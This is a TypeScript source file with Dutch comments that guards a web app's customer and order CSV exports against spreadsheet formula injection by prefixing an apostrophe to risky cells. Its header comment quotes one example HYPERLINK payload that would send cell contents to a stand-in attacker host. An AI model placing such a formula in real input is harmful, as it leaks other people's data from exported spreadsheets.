/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 *
 * CSV-veiligheid tegen formule-injectie (CWE-1236 / CSV Injection).
 *
 * Beide CSV-exports in deze app (klantenlijst, orders) bevatten velden die een
 * anonieme bezoeker vrij kan invullen: `name`/`companyName` bij zelfregistratie
 * hebben geen tekenbeperking (alleen `min(2)`), en `customerName`/
 * `deliveryAddress` bij een order hebben alleen een lengtelimiet. Niets
 * verhinderde een waarde als `=HYPERLINK("http://evil.example/?x="&B2,"Open")`
 * of een DDE-payload als naam.
 *
 * Excel/Sheets/LibreOffice behandelen een celwaarde die begint met `=`, `+`,
 * `-`, `@`, tab of CR als formule, ongeacht of het veld in de CSV tussen
 * aanhalingstekens staat — CSV-quoting gaat over kolomscheiding, niet over hoe
 * de spreadsheet de inhoud interpreteert. Zodra een beheerder de export opent,
 * voert de spreadsheet de formule uit: via HYPERLINK kan dat de inhoud van
 * andere cellen (namen, e-mailadressen, bedragen) naar een externe server
 * lekken, en in oudere Excel-versies met DDE ingeschakeld zelfs willekeurige
 * commando's draaien.
 *
 * Mitigatie (de standaard OWASP-aanpak): begint een waarde met zo'n teken, zet
 * er een apostrof voor. De spreadsheet toont de apostrof niet en behandelt de
 * rest als tekst in plaats van als formule.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/** Eén CSV-cel, veilig voor formule-injectie én correct gequote. */
export function csvCell(raw: unknown): string {
  let s = String(raw ?? "");
  if (FORMULA_TRIGGER.test(s)) s = "'" + s;
  return s.includes(",") || s.includes('"') || s.includes("\n") || s.includes("\r")
    ? `"${s.replace(/"/g, '""')}"`
    : s;
}

/** Rijen (elk een array cellen) tot een volledig CSV-bestand, CRLF-gescheiden. */
export function toCsv(rows: unknown[][]): string {
  return rows.map(row => row.map(csvCell).join(",")).join("\r\n");
}
